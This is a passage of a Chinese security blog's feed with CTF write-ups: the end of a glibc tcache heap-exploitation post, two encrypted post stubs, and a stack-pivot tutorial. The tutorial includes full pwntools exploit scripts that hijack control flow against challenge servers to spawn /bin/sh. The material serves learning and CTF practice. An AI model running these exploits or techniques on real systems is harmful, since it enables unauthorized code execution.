class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体来看一下这个过程，先看这三个地址。</p><p><img src="/2021/03/08/tcache/image-20210318152451146.png" alt="image-20210318152451146"></p><p>先c一下，6个放入tcache</p><p><img src="/2021/03/08/tcache/image-20210318153644695.png" alt="image-20210318153644695"></p><p>再c，观察bins结构</p><p><img src="/2021/03/08/tcache/image-20210318153928275.png" alt="image-20210318153928275"></p><p>c两下，可以看到两个tcache已经分配了</p><p><img src="/2021/03/08/tcache/image-20210318154115014.png" alt="image-20210318154115014"></p><p>可以看到栈上的地址已经上了cache链，直接分配就行了</p><p><img src="/2021/03/08/tcache/image-20210318154918326.png" alt="image-20210318154918326"></p><blockquote><p>为什么会这样？</p><p>先看这个smallbin的结构</p><p><img src="/2021/03/08/tcache/image-20210318164858035.png" alt="image-20210318164858035"></p><p>之后我们把2的bk指针改为栈上的地址。</p><p>calloc之后就成为了这样</p><p><img src="/2021/03/08/tcache/image-20210318165216882.png" alt="image-20210318165216882"></p><p>这里说明一下为什么要使用calloc进行申请chunk，这是<strong>因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块</strong>，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk[0]</p><p>这个时候就到了前面理论部分描述的内容了：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk[2]和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var开始顺着bk链接到 tcachebin 中 ，在这个过程中<strong>只对第一个 chunk[2]进行了完整性检查，后面的stack_var的检查缺失</strong>。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中</p><p><strong>同时这里还写入了一个libc，位于0x00007fffffffded0+0x10</strong></p><p><img src="/2021/03/08/tcache/image-20210318174356049.png" alt="image-20210318174356049"></p></blockquote><h2 id="5-libc-leak"><a href="#5-libc-leak" class="headerlink" title="5.libc leak"></a>5.libc leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;down的wiki，便于自己多看。主要梳理一下结构。&lt;/p&gt;
&lt;h1 id=&quot;0x01-Introduction&quot;&gt;&lt;a href=&quot;#0x01-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x01 Introduction&quot;&gt;&lt;/a&gt;0</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>house of系列</title>
    <link href="https://pz1o.top/2021/03/06/house-of%E7%B3%BB%E5%88%97/"/>
    <id>https://pz1o.top/2021/03/06/house-of%E7%B3%BB%E5%88%97/</id>
    <published>2021-03-06T03:15:29.000Z</published>
    <updated>2021-04-18T15:07:19.202Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19ZAHBsq2sn390z4jKGbPtX/48JWRhSumc= </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码详解</title>
    <link href="https://pz1o.top/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/"/>
    <id>https://pz1o.top/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/</id>
    <published>2021-03-05T13:49:53.000Z</published>
    <updated>2021-04-18T15:08:06.891Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>栈迁移</title>
    <link href="https://pz1o.top/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <id>https://pz1o.top/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/</id>
    <published>2021-03-02T02:39:42.000Z</published>
    <updated>2021-03-02T14:15:10.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h1><p>call一个函数实际进行的操作</p><blockquote><p>push eip+4;</p><p>push ebp;</p><p>mov ebp,esp;</p></blockquote><p>以保护现场，避免执行完函数后堆栈不平衡或者找不到之前的入口地址。</p><p>在执行完函数后也会进行一系列对应的操作来还原现场<code>leave;ret;</code></p><p>这边的leave就相当于进入函数栈操作的逆过程。</p><blockquote><p>leave == mov esp,ebp; pop ebp;<br>ret == pop eip #弹出栈顶数据给eip寄存器</p></blockquote><p>这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）</p><h1 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h1><p>主要是为了解决栈溢出可以，但溢出空间大小不足的问题（如read函数的字节限制等）</p><p>所以我们就要通过控制ebp来绕过限制。</p><h1 id="0x03-如何利用"><a href="#0x03-如何利用" class="headerlink" title="0x03 如何利用"></a>0x03 如何利用</h1><p>要想控制程序流程，我们首要控制的就是eip的值，而eip是由ret来获取的。</p><p>在不改变eip的情况下，所以我们想到的就是改变ret前面的内容。</p><p>这里就产生一个思路，如果我们能控制ebp和esp到任意位置，那么eip不也就随意控制了吗？</p><ol><li>栈溢出覆盖ebp，到指定栈顶的位置</li><li>esp确定好位置，伪造eip即可</li></ol><h1 id="0x04-例题"><a href="#0x04-例题" class="headerlink" title="0x04 例题"></a>0x04 例题</h1><h2 id="printf打印栈地址"><a href="#printf打印栈地址" class="headerlink" title="printf打印栈地址"></a>printf打印栈地址</h2><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><blockquote><p>打印只需要到ebp位置就可以</p></blockquote><p>比较基础的栈迁移的题目</p><p>我们只需要获取ebp就可以</p><p>这里需要调试一下才能看清楚情况</p><p><img src="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302164451946.png" alt="image-20210302164451946"></p><p>两次输出 第一次获取栈地址 第二次直接构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28770</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.1")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.1"</span>)</span><br><span class="line">sys = elf.sym[<span class="string">"system"</span>]</span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">pld = <span class="string">"A"</span>*<span class="number">0x27</span></span><br><span class="line">sl(pld)</span><br><span class="line">ebp = uu32(ru(<span class="string">"\xff"</span>,drop=<span class="literal">False</span>)[<span class="number">-4</span>:])</span><br><span class="line">leak(<span class="string">"ebp"</span>,ebp)</span><br><span class="line">esp = ebp - <span class="number">0x48</span></span><br><span class="line">pld = (<span class="string">b"A"</span>*<span class="number">0x4</span> + p32(sys) + p32(main) + p32(esp+<span class="number">0x20</span>) + <span class="string">"/bin/sh\x00"</span> ).ljust(<span class="number">0x28</span>,<span class="string">'A'</span>) + p32(esp+<span class="number">0x10</span>) + p32(leave_ret)</span><br><span class="line">s(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="劫持到bss段"><a href="#劫持到bss段" class="headerlink" title="劫持到bss段"></a>劫持到bss段</h2><h3 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h3><p><img src="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302221412110.png" alt="image-20210302221412110"></p><blockquote><p>bss段上可以写，直接迁移到bss段上，然后继续write泄露，getshell</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29456</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.2")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.231.so"</span>)</span><br><span class="line">bss = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">puts = elf.sym[<span class="string">"puts"</span>]</span><br><span class="line">write_plt = elf.sym[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">pld = p32(<span class="number">0</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">sa(<span class="string">"What is your name?"</span>,pld)</span><br><span class="line">pld = <span class="string">b"A"</span>*<span class="number">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class="line">sa(<span class="string">"What do you want to say?"</span>,pld)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc_base = write - libc.sym[<span class="string">"write"</span>]</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">sh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">pld = p32(<span class="number">0</span>) + p32(sys) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line">sa(<span class="string">"What is your name?"</span>,pld)</span><br><span class="line">pld = <span class="string">b"A"</span>*<span class="number">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class="line">sa(<span class="string">"What do you want to say?"</span>,pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-基本原理&quot;&gt;&lt;a href=&quot;#0x01-基本原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本原理&quot;&gt;&lt;/a&gt;0x01 基本原理&lt;/h1&gt;&lt;p&gt;call一个函数实际进行的操作&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;push e</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
</feed>
